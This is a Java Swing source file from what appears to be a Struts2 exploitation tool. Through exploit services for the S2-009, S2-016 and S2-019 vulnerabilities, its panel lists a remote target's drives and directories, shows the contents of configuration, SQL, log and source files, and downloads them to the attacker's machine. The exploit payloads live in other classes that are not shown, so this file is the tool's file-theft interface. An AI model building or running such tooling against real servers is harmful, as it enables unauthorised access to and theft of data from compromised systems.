package org.vit.ui;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.io.File;

import javax.swing.JFileChooser;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.GroupLayout;
import javax.swing.JPopupMenu;
import javax.swing.JScrollPane;
import javax.swing.JTabbedPane;
import javax.swing.JTextPane;
import javax.swing.JTree;
import javax.swing.GroupLayout.Alignment;
import javax.swing.JSplitPane;
import javax.swing.tree.DefaultMutableTreeNode;
import javax.swing.tree.DefaultTreeModel;

import org.vit.model.MyURL;
import org.vit.service.ExploitService;
import org.vit.service.impl.Struts2_S016_ExploitServiceImpl;
import org.vit.service.impl.Struts2_S019_ExploitServiceImpl;
import org.vit.service.impl.Struts2_S09_ExploitServiceImpl;

public class FileViewPanel extends JPanel{
private static final long serialVersionUID = 1L;
	
	private JTree fileJTree;
	
	private JTabbedPane fileContentJTabbedPane;
	
	private JTextPane fileConentJTextPane;
	
	private JPopupMenu rightJPopupMenu;
	
	private DefaultMutableTreeNode root=new DefaultMutableTreeNode("\u6211\u7684\u7535\u8111");
	
	private JFileChooser filesaveChooser;

	private MyURL myURL;
	
	private String version;
	
	public MyURL getMyURL() {
		return myURL;
	}

	public void setMyURL(MyURL myURL) {
		this.myURL = myURL;
	}

	public String getVersion() {
		return version;
	}

	public void setVersion(String version) {
		this.version = version;
	}
	
	
	public FileViewPanel(){
		setSize(600,460);
		setVisible(true);
		
		JSplitPane splitPane = new JSplitPane();
		splitPane.setDividerLocation(160);
		
		fileJTree=new JTree(root);
		
		JScrollPane fileJtreeJScrollPane=new JScrollPane(fileJTree);
		
		fileContentJTabbedPane=new JTabbedPane();
		
		this.fileContentJTabbedPane.addMouseListener(new MouseAdapter() {
			public void mouseClicked(MouseEvent e) {
				if ((e.getClickCount() == 2)&&(FileViewPanel.this.fileContentJTabbedPane.getTabCount()> 0)) {
					FileViewPanel.this.fileContentJTabbedPane.remove(FileViewPanel.this.fileContentJTabbedPane.getSelectedIndex());
				}
			}
		});
		
		
		fileJTree.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseClicked(MouseEvent e) { 
				
				if (fileJTree.getSelectionCount()!=0&&e.getButton() == MouseEvent.BUTTON3) { 
					rightJPopupMenu=new JPopupMenu();
					final JMenuItem download = new JMenuItem("\u4e0b\u8f7d");
					final JMenuItem refresh = new JMenuItem("\u5237\u65b0");
					rightJPopupMenu.add(download);
					rightJPopupMenu.add(refresh);
					rightJPopupMenu.show(fileJTree, e.getX(), e.getY());
					
					download.addActionListener(new ActionListener() {
						@Override
						public void actionPerformed(ActionEvent e) {
							if (e.getSource() == download) {
								try {
									String path="";
									String longText=fileJTree.getSelectionPath().toString();
									String text[]=longText.substring(1, longText.length()-1).split(",");
									for (int k = 0; k < text.length; k++) {
										path+=text[k].trim()+"/";
									}
									path=path.substring(5, path.length()-1);
									String rquestPath=path.replaceAll("\\\\", "/");
									
									if (!doIsDirectory(rquestPath)) {
										filesaveChooser=new JFileChooser();
										
										File showFile=new File(path);
										filesaveChooser.setSelectedFile(showFile);
										
										int option = filesaveChooser.showSaveDialog(null); 		
										
										if(option == JFileChooser.APPROVE_OPTION){
											File file= filesaveChooser.getSelectedFile(); 
											doDownload(rquestPath,file.getAbsolutePath());
											JOptionPane.showMessageDialog(null, "下载完成");
										}
									}
								} catch (Exception e1) {
									JOptionPane.showMessageDialog(null, "下载失败");
								}
								
							}
						}

					});
					
					refresh.addActionListener(new ActionListener() {
						@Override
						public void actionPerformed(ActionEvent e) {
							if (e.getSource() == refresh) {
								showFileContent();
							}
						}
					});
				}
				
				if (fileJTree.getSelectionCount()!=0 && e.getClickCount() ==2) {
					showFileContent();
				}
				
			}
		}); 
		
		
		JScrollPane fileContentJScrollPane=new JScrollPane(fileContentJTabbedPane);
		
	    splitPane.setLeftComponent(fileJtreeJScrollPane);
	    
	    splitPane.setRightComponent(fileContentJScrollPane);
		
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addComponent(splitPane, GroupLayout.DEFAULT_SIZE, 600, Short.MAX_VALUE)
		);
		groupLayout.setVerticalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addComponent(splitPane, GroupLayout.DEFAULT_SIZE, 460, Short.MAX_VALUE)
		);
		
		setLayout(groupLayout);
	}
	
	public void showFileContent(){
		
			DefaultMutableTreeNode selectedNode = (DefaultMutableTreeNode) fileJTree.getLastSelectedPathComponent(); 
			
			if (fileJTree.getSelectionPath().toString().equals("[\u6211\u7684\u7535\u8111]")) {
				
				new Thread(new Runnable() {
					@Override
					public void run() {
						try {
							int size=Integer.parseInt(doGetFileSystem(".length"));
							DefaultTreeModel defaultTreeModel=null;
							root  =   new  DefaultMutableTreeNode("\u6211\u7684\u7535\u8111");
							for (int i = 0; i <size; i++) {
								DefaultMutableTreeNode child = new  DefaultMutableTreeNode(doGetFileSystem("["+i+"]"));
								root.add(child);
							}
							defaultTreeModel  =   new  DefaultTreeModel (root);
							fileJTree.setModel(defaultTreeModel);
							
						} catch (Exception e2) {
							e2.printStackTrace();
							JOptionPane.showMessageDialog(fileJTree.getParent().getParent().getParent(),"\u5bf9\u4e0d\u8d77\uff0c\u5217\u76ee\u5f55\u5931\u8d25\uff01");
						}
					}
				}).start();
				
			}else {
				
				String fileName=selectedNode.toString();
				
				String path="";
				String longText=fileJTree.getSelectionPath().toString();
				String text[]=longText.substring(1, longText.length()-1).split(",");
				for (int k = 0; k < text.length; k++) {
					path+=text[k].trim()+"/";
				}
				
				path=path.substring(5, path.length());
				String rquestPath=path.replaceAll("\\\\", "/");
				int size= doGetFileNum(rquestPath);
				
				if (fileName.indexOf(".")!=-1) {
					String fileExt=fileName.substring(fileName.lastIndexOf("."), fileName.length());
					if (fileExt.equals(".properties")||fileExt.equals(".xml")||fileExt.equals(".ini")
							||fileExt.equals(".jsp")||fileExt.equals(".txt")||fileExt.equals(".asp")
							||fileExt.equals(".reg")||fileExt.equals(".sql")||fileExt.equals(".log")
							||fileExt.equals(".php")||fileExt.equals(".html")||fileExt.equals(".cpp")
							||fileExt.equals(".css")||fileExt.equals(".htm")||fileExt.equals(".java")
							||fileExt.equals(".jspx")||fileExt.equals(".jsf")||fileExt.equals(".conf")
							||fileExt.equals(".aspx")||fileExt.equals(".bat")) {
						fileConentJTextPane=new JTextPane();
						String fileContent=doGetFileContent(rquestPath);
						fileContentJTabbedPane.addTab(fileName,fileConentJTextPane);
						fileConentJTextPane.setText(fileContent);
						fileConentJTextPane.setCaretPosition(0);
					}else {
						selectedNode.removeAllChildren();
						for (int j = 0; j < size; j++) {
							DefaultMutableTreeNode child = new  DefaultMutableTreeNode(doListFiles(rquestPath,"["+j+"]"));
							selectedNode.add(child);
						}
					}
				}else {
					selectedNode.removeAllChildren();
					for (int j = 0; j < size; j++) {
						DefaultMutableTreeNode child = new  DefaultMutableTreeNode(doListFiles(rquestPath,"["+j+"]"));
						selectedNode.add(child);
					}
					
				}
			}
			
		fileJTree.repaint();
		
	}

	
	private String doGetFileContent(String rquestPath) {
		ExploitService service=null;
		
		if (version.equals("s09")) {
			service=new Struts2_S09_ExploitServiceImpl();
		}
		
		if (version.equals("s016")) {
			service=new Struts2_S016_ExploitServiceImpl();
		}
		
		if (version.equals("s019")) {
			service=new Struts2_S019_ExploitServiceImpl();
		}
		
		try {
			return service.doGetFileContent(myURL, rquestPath);
		} catch (Exception e) {
			return e.getMessage();
		}
	}

	private int doGetFileNum(String rquestPath) {
		
		ExploitService service=null;
		
		if (version.equals("s09")) {
			service=new Struts2_S09_ExploitServiceImpl();
		}
		
		if (version.equals("s016")) {
			service=new Struts2_S016_ExploitServiceImpl();
		}
		
		if (version.equals("s019")) {
			service=new Struts2_S019_ExploitServiceImpl();
		}
		
		try {
			return service.doGetFileNum(myURL, rquestPath);
		} catch (Exception e) {
			return 0;
		}
	}

	private String doListFiles(String rquestPath, String agrs) {
		
		ExploitService service=null;
		
		if (version.equals("s09")) {
			service=new Struts2_S09_ExploitServiceImpl();
		}
		
		if (version.equals("s016")) {
			service=new Struts2_S016_ExploitServiceImpl();
		}
		
		if (version.equals("s019")) {
			service=new Struts2_S019_ExploitServiceImpl();
		}
		
		try {
			return service.doListFiles(myURL, rquestPath, agrs);
		} catch (Exception e) {
			e.printStackTrace();
			return e.toString();
		}
	}
	
	private String doGetFileSystem(String agrs) throws Exception{
		ExploitService service=null;
		
		if (version.equals("s09")) {
			service=new Struts2_S09_ExploitServiceImpl();
		}
		
		if (version.equals("s016")) {
			service=new Struts2_S016_ExploitServiceImpl();
		}
		
		if (version.equals("s019")) {
			service=new Struts2_S019_ExploitServiceImpl();
		}
		
		return service.doGetFileSystem(myURL, agrs);
	}
	
	
	public boolean doIsDirectory(String rquestPath) {
		ExploitService service=null;
		
		if (version.equals("s09")) {
			service=new Struts2_S09_ExploitServiceImpl();
		}
		
		if (version.equals("s016")) {
			service=new Struts2_S016_ExploitServiceImpl();
		}
		
		if (version.equals("s019")) {
			service=new Struts2_S019_ExploitServiceImpl();
		}
		
		try {
			return service.doIsDirectory(myURL, rquestPath);
		} catch (Exception e) {
			e.printStackTrace();
			return false;
		}
	}
	
	public void doDownload(String rpath,String lpath) {
		ExploitService service=null;
		
		if (version.equals("s09")) {
			service=new Struts2_S09_ExploitServiceImpl();
		}
		
		if (version.equals("s016")) {
			service=new Struts2_S016_ExploitServiceImpl();
		}
		
		if (version.equals("s019")) {
			service=new Struts2_S019_ExploitServiceImpl();
		}
		
		try {
			service.doDownload(myURL, rpath, lpath);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}
